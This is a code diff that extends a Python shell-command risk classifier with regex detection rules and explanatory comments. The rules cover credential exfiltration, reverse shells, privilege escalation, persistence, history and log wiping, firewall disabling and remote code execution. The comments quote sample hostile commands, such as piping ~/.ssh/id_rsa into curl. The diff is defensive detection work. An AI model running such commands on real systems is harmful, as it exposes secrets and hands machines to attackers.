@@ -239,6 +239,69 @@ def _flags(tokens: list[str]) -> set[str]:
     return out
 
 
+# ---------------------------------------------------------------------------
+# SEMANTIC RISK CLASSES
+#
+# Everything above this point asks one question: does this command destroy
+# something the machine needs? That is a single axis, and it is not the only
+# one. A published ablation of a rule-based shell risk classifier (CARE, ISSRE
+# 2026) removed each of its components in turn: dropping SEMANTIC risk classes
+# cost 26.7pp of F1, dropping path sensitivity cost 17.0pp, and dropping AST
+# structure cost 1.8pp. A flat regex denylist with no semantic classes at all
+# scored 29% F1 where the full classifier scored 86%. The gap is not "more
+# critical paths". It is that a command can leave every file on disk intact and
+# still hand the machine to somebody else: exfiltrate a key, open a callback,
+# escalate to root, install persistence, or erase the record of having done it.
+#
+# The discipline of the rest of this module still applies, and it is the reason
+# these rules are written the way they are: EVERY rule below requires BOTH
+# halves of the risk -- a secret AND an outbound sink, a socket AND a shell,
+# sudo AND a shell escape, a mode AND the setuid bit -- because either half on
+# its own is ordinary work. `cat ~/.ssh/config`, `nc -z host 22`, `sudo tar`,
+# and `chmod 755` must all stay silent, or the banner gets ignored and the
+# banner was the whole protection.
+# ---------------------------------------------------------------------------
+
+# Files that ARE a credential, as a regex fragment reused by several rules.
+# PUBLIC keys are deliberately excluded by lookahead: copying `id_rsa.pub` to a
+# server is the normal way to set up ssh access, and it is one of the commonest
+# legitimate commands involving a key path there is. Flagging it would poison
+# the whole class.
+SECRET_FILE = (
+    r"(?:id_rsa|id_dsa|id_ecdsa|id_ed25519)(?!\.pub)"
+    r"|/etc/(?:shadow|gshadow)(?![\w.])"
+    r"|\.aws/credentials|\.netrc|\.pgpass|\.git-credentials|\.npmrc|\.pypirc"
+    r"|\.docker/config\.json|\.kube/config|\.gnupg/[\w.-]{1,40}"
+    r"|private[_-]?key|\.pem(?![\w])|(?<![\w-])\.env(?![\w.])"
+)
+
+# Sinks that carry bytes OFF this machine. `ssh` is deliberately NOT one of
+# them: `cat ~/.ssh/id_rsa.pub | ssh host 'cat >> ~/.ssh/authorized_keys'` is
+# the hand-rolled ssh-copy-id -- it names a key path and pipes into a network
+# tool while being completely benign. Requiring a sink that takes a BODY
+# (curl --data/-T/-F, a raw socket, or a mailer) keeps that idiom quiet.
+NET_SINK = (
+    r"\|\s{0,4}(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|socat|mail|mailx|sendmail)\b"
+    r"|\b(?:curl|wget)\b[^|;]{0,200}(?:--data|--upload-file|--form|\s-d\s|\s-T\s|\s-F\s)"
+)
+
+# scp/rsync/sftp are handled apart from NET_SINK because their sink token comes
+# BEFORE the secret (`scp ~/.ssh/id_rsa host:`) and their destination comes
+# after it, so neither "secret then sink" nor "sink then secret" ordering can
+# express them -- the secret sits in the middle. A remote destination
+# (`user@host:`) is required, so an ordinary local `scp` or `rsync` of a
+# key between directories stays silent.
+COPY_OUT = (
+    rf"\b(?:scp|rsync|sftp)\b[^|;]{{0,160}}(?:{SECRET_FILE})"
+    rf"[^|;]{{0,160}}[\w.-]{{1,64}}@[\w.-]{{1,64}}:"
+)
+
+# Shell startup files. Anything appended here executes on every future login,
+# which is what makes them the standard persistence target; anything that
+# TRUNCATES one destroys a config the user cannot get back.
+SHELL_RC = (r"(?:\.bashrc|\.bash_profile|\.bash_login|\.profile|\.zshrc|\.zprofile"
+            r"|\.zshenv|\.kshrc|\.cshrc|/etc/profile|/etc/bash\.bashrc)")
+
 # Patterns checked against the WHOLE command, never per-segment. Anything that
 # needs to see a `|` or `;` must live here -- that was the dead-code bug.
 WHOLE_DANGER = [
@@ -340,6 +403,156 @@ WHOLE_DANGER = [
     (re.compile(r"\bgit\s+reflog\s+expire\b[^|;]*--expire(?:=|\s+)(?:now|all)"
                 r"|\bgit\s+gc\b[^|;]*--prune(?:=|\s+)now"),
      "expires the reflog -- removes git's last-resort recovery path"),
+
+    # --- SEMANTIC CLASS: credential exfiltration -------------------------
+    # A secret path on its own is not a finding (`chmod 600 ~/.ssh/id_rsa` is
+    # the CORRECT thing to do) and a network sink on its own is not either
+    # (`curl -d @payload.json`). The pair is. Both orders are matched because
+    # the secret is the argument of the sink about as often as it is the source
+    # of the pipe: `cat ~/.ssh/id_rsa | curl -d @- host` vs
+    # `curl -F key=@~/.ssh/id_rsa host`.
+    (re.compile(rf"(?:{SECRET_FILE})[^;&]{{0,240}}(?:{NET_SINK})"
+                rf"|(?:{NET_SINK})[^;&]{{0,240}}(?:{SECRET_FILE})"
+                rf"|{COPY_OUT}"),
+     "sends a private key or credential file off this machine"),
+
+    # --- SEMANTIC CLASS: reverse shells and callbacks --------------------
+    # bash's /dev/tcp is not a real device: the shell itself opens the socket,
+    # so no external binary appears in the command and nothing above this line
+    # sees anything at all. Paired with a shell name or the `0>&1` stdin
+    # re-attach, it is the canonical reverse shell and has essentially no
+    # benign form. A bare `/dev/tcp` read (a port check) is left to CAUTION.
+    (re.compile(r"\b(?:ba|z|k|da|a)?sh\b[^|;]{0,80}/dev/(?:tcp|udp)/"
+                r"|/dev/(?:tcp|udp)/[^\s;]{0,80}0>&1"
+                r"|>&\s{0,4}/dev/(?:tcp|udp)/"),
+     "reverse shell: attaches a shell's stdin/stdout to a remote socket"),
+    # netcat's -e/--exec hands an interpreter to whoever connects. Matched as
+    # a flag CLUSTER ending in e or c so `-e` and `-ve` both hit, while the
+    # everyday `nc -zv host 22` / `nc -l -p 4444` clusters (ending z, v, p)
+    # do not.
+    (re.compile(r"\b(?:nc|ncat|netcat|nc\.traditional)\b[^|;]{0,160}"
+                r"(?:\s-\w{0,3}[ec](?=\s)|--exec\b|--sh-exec\b|--lua-exec\b)"),
+     "netcat -e/--exec hands a shell to whoever connects"),
+    # The no-`-e` workaround, for the many builds of netcat compiled without
+    # it: a named pipe loops the shell's output back into the same connection.
+    # `[^\n]` rather than `[^;]` here and in the interpreter rule below: the
+    # whole point of this idiom is that it is a `;`-joined sequence, and the
+    # scripted form embeds `;` inside the quoted program text.
+    (re.compile(r"\bmkfifo\b[^\n]{0,200}\|[^\n]{0,200}\b(?:nc|ncat|netcat)\b"
+                r"|\b(?:nc|ncat|netcat)\b[^\n]{0,200}\|[^\n]{0,200}\bmkfifo\b"),
+     "named-pipe reverse shell (mkfifo looped into netcat)"),
+    (re.compile(r"\bsocat\b[^;]{0,200}\b(?:EXEC|SYSTEM):"),
+     "socat EXEC:/SYSTEM: runs a program for the remote peer -- a bind/reverse shell"),
+    # The interpreter variants. `socket` alone is ordinary scripting, so a
+    # shell-attach primitive (pty.spawn, dup2, an explicit /bin/sh) is required
+    # alongside it -- `python3 -c 'import socket; print(socket.gethostname())'`
+    # must stay silent.
+    (re.compile(r"\b(?:python\d?(?:\.\d+)?|perl|ruby|php|node)\b[^\n]{0,400}\bsocket\b"
+                r"[^\n]{0,400}(?:pty\.spawn|dup2|/bin/(?:ba|z|k|da)?sh|\bexec\s*\()"),
+     "scripted reverse shell: opens a socket and attaches a shell to it"),
+
+    # --- SEMANTIC CLASS: privilege escalation ----------------------------
+    # A setuid binary runs as its OWNER for every user on the box, so
+    # `chmod u+s /bin/bash` is a permanent root backdoor that leaves the
+    # filesystem otherwise untouched. Only the setUID bit is DANGER here: the
+    # setGID form (`g+s`, 2775) is the legitimate shared-directory idiom and is
+    # a CAUTION below. The mode alternative needs four octal digits starting
+    # 4/6/7, so the three-digit everyday modes (755, 644, 777) cannot match.
+    (re.compile(r"\bchmod\b[^|;]{0,120}\s(?:0?[467][0-7]{3}|[ugoa]*u\+s|\+s(?=\s|$))"),
+     "sets the setuid bit -- the file then runs as its owner (root) for every user"),
+    # Group membership that is root by another name. The group must come AFTER
+    # the verb, so a `sudo useradd bob` prefix does not match itself. `&` is
+    # excluded from the span as well as `|;`: a real model output in the replay
+    # set, `sudo useradd -m myuser && sudo passwd myuser && sudo usermod -aG
+    # docker myuser`, matched `useradd` here and then the `sudo` of the NEXT
+    # command as its group. The span must not cross a command boundary of any
+    # kind, and `&&` is by far the commonest one in generated one-liners.
+    (re.compile(r"\b(?:usermod|gpasswd|adduser|useradd)\b[^|;&]{0,120}"
+                r"(?<![\w-])(?:sudo|wheel|admin|root)(?![\w-])"),
+     "grants root-equivalent group membership"),
+    # `NOPASSWD` has exactly one meaning wherever it appears, and
+    # /etc/sudoers.d/ is a drop-in directory the /etc/sudoers rules never
+    # covered because the filename differs every time.
+    (re.compile(r"NOPASSWD"), "grants passwordless sudo"),
+    (re.compile(r">\|?>?\s{0,4}/etc/sudoers\.d/|\btee\b[^|;]{0,120}/etc/sudoers"),
+     "installs a new sudo rule"),
+    # GTFOBins-style living off the land: sudo is granted for a specific tool,
+    # and the tool is then made to spawn a shell, which inherits root. The tool
+    # list alone is far too broad to act on (`sudo tar -czf ...` is routine),
+    # so a shell-spawn primitive in the same segment is required. `-exec` with
+    # one dash is deliberately NOT a primitive -- `sudo find /var/log -exec rm`
+    # is ordinary and is judged by the delete rules instead.
+    (re.compile(r"\bsudo\b[^|;&]{0,200}\b(?:find|tar|zip|awk|gawk|mawk|perl|python\d?|ruby"
+                r"|node|lua|vim|vi|view|nano|ed|less|more|man|ftp|nmap|git|env|nice"
+                r"|tcpdump|rsync|xargs)\b[^|;&]{0,200}"
+                r"(?:/bin/(?:ba|z|k|da)?sh|\bsystem\s*\(|\bos\.system|pty\.spawn"
+                r"|\bexec\s*\(|:!|!\s{0,2}/bin/|--interactive|checkpoint-action=exec)"),
+     "living off the land: sudo runs a tool that then spawns a root shell"),
+
+    # --- SEMANTIC CLASS: persistence -------------------------------------
+    # A TRUNCATING redirect over a shell startup file replaces a config the
+    # user has accumulated for years with one line. The append form is the
+    # legitimate idiom and is a CAUTION below; `(?<!>)` is what separates them.
+    (re.compile(rf"(?<!>)>\|?\s{{0,4}}\S{{0,64}}{SHELL_RC}(?![\w.])"),
+     "overwrites a shell startup file, discarding everything already in it"),
+
+    # --- SEMANTIC CLASS: history and log tampering -----------------------
+    # Covering `history -c` but not `> ~/.bash_history` or `unset HISTFILE`
+    # covered the announcement and not the act. All of these leave the machine
+    # working perfectly and remove the record of what was done to it.
+    (re.compile(r"(?<!>)>\|?\s{0,4}\S{0,64}\.(?:bash|zsh|sh)_history"
+                r"|\b(?:rm|shred|truncate)\b[^|;]{0,120}\.(?:bash|zsh|sh)_history"
+                r"|\bunset\s+HISTFILE(?![\w])|\bHISTFILE=(?:/dev/null|\s|$)"
+                r"|\bset\s\+o\s+history\b|\bexport\s+HISTSIZE=0\b"),
+     "erases or disables shell history -- hides what was run"),
+    # Truncation and vacuuming only. Deleting a rotated log (`rm
+    # /var/log/nginx/access.log.1`) and age-filtered rotation (`find /var/log
+    # -mtime +7 -delete`, already downgraded above) are routine housekeeping;
+    # zeroing a live log file or vacuuming the journal is not.
+    (re.compile(r"(?<!>)>\|?\s{0,4}/var/log/\S+"
+                r"|\btruncate\b[^|;]{0,80}-s\s{0,2}0\s+/var/log/"
+                r"|\bjournalctl\b[^|;]{0,80}--vacuum-(?:time|size|files)"),
+     "wipes a system log in place"),
+
+    # --- SEMANTIC CLASS: firewall / MAC controls -------------------------
+    # The branch's iptables -F rule covered flushing but not the other three
+    # ways to reach the same state. A default DROP policy applied remotely, or
+    # a firewall stopped on a host you reach over the network, needs console
+    # access to undo -- the same lockout reasoning as the flush rule.
+    (re.compile(r"\bufw\b[^|;&]{0,60}\b(?:disable|reset)\b|\bsetenforce\s+0\b"
+                r"|\bsystemctl\b[^|;&]{0,60}\b(?:stop|disable|mask)\b[^|;&]{0,60}"
+                r"\b(?:firewalld|ufw|iptables|nftables|apparmor)\b"
+                r"|\biptables\b[^|;&]{0,80}-P\s+(?:INPUT|FORWARD)\s+DROP\b"),
+     "disables the host firewall or its mandatory access control"),
+
+    # --- SEMANTIC CLASS: storage teardown --------------------------------
+    # The block-device rules above all key on a `/dev/sd*`-shaped path. LVM,
+    # ZFS and md address their storage by NAME (`vg0/data`, `tank/home`), so
+    # none of those rules could ever see them, and every verb here is as final
+    # as mkfs. `umount /` and `umount -a` unmount the running root filesystem.
+    (re.compile(r"\b(?:lvremove|vgremove|pvremove)\b|\bzpool\s+destroy\b|\bzfs\s+destroy\b"
+                r"|\bmdadm\b[^|;]{0,80}--zero-superblock\b"
+                r"|\bhdparm\b[^|;]{0,80}--security-erase"),
+     "destroys a logical volume, pool or array"),
+    (re.compile(r"\bumount\b[^|;]{0,40}(?:-\w{0,3}a(?=\s|$)|(?<!\S)/(?!\S))"),
+     "unmounts the root filesystem (or everything)"),
+
+    # --- SEMANTIC CLASS: remote code execution, beyond curl|sh -----------
+    # The existing rule matched only a POSIX shell on the right of the pipe.
+    # `curl ... | python3 -` and `curl ... | perl` execute attacker-chosen code
+    # exactly as completely.
+    (re.compile(r"\b(?:curl|wget)\b[^|;]{0,200}\|\s{0,4}(?:sudo\s+)?"
+                r"(?:python\d?(?:\.\d+)?|perl|ruby|node|php)\b"),
+     "pipes remote content straight into an interpreter"),
+    # Process substitution and eval reach the same place without ever forming
+    # a pipe, which is why the pipe-shaped rule above cannot see them.
+    (re.compile(r"(?:\b(?:ba|z|k|da)?sh\b|\bsource\b|(?<![\w.])\.\s)[^|;]{0,40}"
+                r"<\(\s{0,4}(?:curl|wget)\b"
+                r"|\beval\b[^|;]{0,60}[\"']?\$\(\s{0,4}(?:curl|wget)\b"),
+     "executes remote content via process substitution -- the same as curl | sh"),
+    (re.compile(r"\bbase64\b[^|;]{0,60}(?:-d|--decode)[^|;]{0,60}"
+                r"\|\s{0,4}(?:sudo\s+)?(?:ba|z|k|da)?sh\b"),
+     "decodes and executes obfuscated content"),
 ]
 
 WHOLE_CAUTION = [
@@ -369,6 +582,56 @@ WHOLE_CAUTION = [
     (re.compile(r"\bsetfacl\b[^|;]*-\w*R\w*[^|;]*(?<!\S)"
                 r"(/|/etc|/usr|/var|/home|/boot|/bin|/sbin|/root)(?!\S)"),
      "recursively rewrites ACLs on a critical path"),
+
+    # --- SEMANTIC CLASSES, at CAUTION -----------------------------------
+    # Everything here is legitimate often enough that DANGER would be noise,
+    # but is worth naming because the user cannot see the consequence in the
+    # command itself.
+
+    # Reading a credential to the terminal is not exfiltration -- it is how you
+    # check a key, and `sudo cat /etc/shadow` is how you check a lock state.
+    # But it puts the secret into scrollback, the terminal's history, and any
+    # session recording, so it deserves a word. The write verbs are excluded:
+    # `ssh-keygen -f ~/.ssh/id_rsa` and `chmod 600 ~/.ssh/id_rsa` are the
+    # correct handling of a key and must stay silent.
+    (re.compile(rf"\b(?:cat|less|more|head|tail|strings|xxd|od|base64)\b"
+                rf"[^|;]{{0,200}}(?:{SECRET_FILE})"),
+     "prints a private key or credential file to the terminal"),
+    # A raw socket opened by the shell with no shell attached to it: usually a
+    # port check (`cat < /dev/tcp/host/22`), occasionally the first half of
+    # something else. The reverse-shell shapes are DANGER above.
+    (re.compile(r"/dev/(?:tcp|udp)/"),
+     "opens a raw network socket through bash's /dev/tcp"),
+    # `crontab -` REPLACES the crontab rather than adding to it, which is why
+    # the persistence idiom is always `(crontab -l; echo ...) | crontab -`:
+    # without the `crontab -l` the existing jobs are silently gone.
+    (re.compile(r"\|\s{0,4}(?:sudo\s+)?crontab\s+-\s{0,4}(?:$|[|;&])"),
+     "`crontab -` replaces the ENTIRE crontab with what it reads"),
+    # Appending to a startup file or dropping a unit/cron file in place is the
+    # normal way to install something, and also the normal way to install
+    # something unwanted. The distinguishing fact the user needs is only that
+    # it will run again by itself.
+    (re.compile(rf">>\s{{0,4}}\S{{0,64}}{SHELL_RC}(?![\w.])"
+                rf"|\btee\b[^|;]{{0,120}}{SHELL_RC}(?![\w.])"
+                rf"|(?:>\|?>?|\btee\b[^|;]{{0,120}})\s{{0,4}}"
+                rf"/etc/(?:cron\.[a-z]{{1,8}}/|crontab|rc\.local|systemd/system/|init\.d/)"),
+     "installs code that will run automatically on every login or boot"),
+    # World-writable means every account on the machine can rewrite the file,
+    # including a compromised service account -- and for a directory it means
+    # anyone can replace its contents. The mode alternative matches only modes
+    # whose OTHER digit carries the write bit (2/3/6/7), so `755`, `644` and
+    # `775` stay silent; `chmod -R 777 .` is the shape this exists for.
+    (re.compile(r"\bchmod\b[^|;]{0,120}\s(?:[0-7]{0,1}[0-7]{2}[2367](?=\s|$)|[ugoa]*o\+w)"),
+     "makes files writable by every user on the machine"),
+    # setgid on a directory makes new files inherit its group, which is the
+    # standard shared-project setup -- named, not warned about.
+    (re.compile(r"\bchmod\b[^|;]{0,120}\s(?:0?[2][0-7]{3}(?=\s|$)|[ugoa]*g\+s)"),
+     "sets the setgid bit"),
+    # Remounting the root filesystem read-only does not destroy anything and is
+    # undone by a remount, but every running service that writes will start
+    # failing immediately.
+    (re.compile(r"\bmount\b[^|;]{0,80}\bremount\b[^|;]{0,40}(?<!\S)/(?!\S)"),
+     "remounts the root filesystem -- running services may start failing"),
 ]
 
 PLACEHOLDER_RE = re.compile(r"<[^<>\s][^<>]*>")
